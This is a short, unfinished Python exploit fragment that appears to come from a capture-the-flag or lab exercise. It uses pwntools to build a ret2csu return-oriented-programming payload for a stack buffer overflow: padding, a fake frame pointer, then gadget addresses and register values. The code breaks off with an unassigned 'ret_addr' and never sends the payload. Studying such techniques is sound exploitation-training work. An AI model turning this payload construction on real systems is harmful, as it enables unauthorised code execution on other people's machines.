from pwn import *
context.log_level='debug'
end_addr=0x40065a
start_addr=0x600640
fakeebp='b'*8
ret_addr=
def csu(rbx,rbp,r12,r13,r14,r15,ret_addr):
	payload='a'*0x80+fakeebp
	payload+=p64(ret_addr)
	payload+=p64(end_addr)
	payload+=p64(rbx)
	payload+=p64(rbp)
	payload+=p64(r12)
	payload+=p64(r13)
	payload+=p64(r14)
	payload+=p64(r15)
	payload+=p64(start_addr)
	
